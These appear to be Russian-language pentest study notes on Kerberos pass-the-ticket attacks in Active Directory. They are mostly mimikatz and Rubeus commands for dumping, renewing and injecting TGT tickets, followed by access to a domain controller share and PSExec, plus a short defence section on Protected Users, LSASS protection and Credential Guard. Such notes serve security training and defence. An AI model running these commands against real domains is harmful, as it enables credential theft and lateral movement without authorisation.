#windows #AD #attacks #kerberos

> Для проведения атаки необходимы билеты TGT или TGS

### Получение билетов
1) Знать учетные данные
2) Предварительно сдампив

Дамп билетов
```mimikatz
kerberos::list /export
```

Далее создаются 2 файла `.kirbi`

C этими билетами можно выполнить атаку:

1) Инжект билетов в сессию
```mimikatz
kerberos::ptt directory .
```

2) Запуск cmd от имени другого пользователя
```mimikarz
misc::cmd
```

3) В cmd мы другой пользователь
```cmd
whoami
```

## Создание Жертвенного процесса

> Жертвенный процесс нужен для того, чтобы не перезаписать текущую рабочую сессию пользователя или службы, но он может быть обнаружен и для него нужны права админа

1) Создание процесса через NetOnly
```powershell
.\Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

2) Просмотр всех тикетов, которые можно извлечь
```powershell
.\Rubeus.exe triage
```

3) Извлекаем интересующий нас билет ПОЛЬЗОВАТЕЛЯ
```powershell
.\Rubeus.exe dump /luid:0x89275d /service:krbtgt /nowrap
```

4) Обновляем билет и сразу инжектируем в сессию
```powershell
Rubeus.exe renew /ticket:doIFVjCCBVKgAwIBBaEDA<SNIP> /ptt
```

5) Используем для доступа к сервису
```cmd
dir \\dc01\\c$
# или
PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
```

# Защита

### 1) Если пользователь в группе Protected Users:

Windows:
- не хранит NT hash в памяти
- требует AES Kerberos
- запрещает NTLM
Overpass‑the‑Hash становится невозможен.

### 2) LSASS protection

Включить RunAsPPL
LSASS становится protected process.
[[Mimikatz]] не сможет читать память.

### 3) Credential Guard

Функция Windows, которая защищает LSASS.
Credential Guard:
- изолирует NT hashes
- использует virtualization‑based security
attacker не может извлечь NT hash.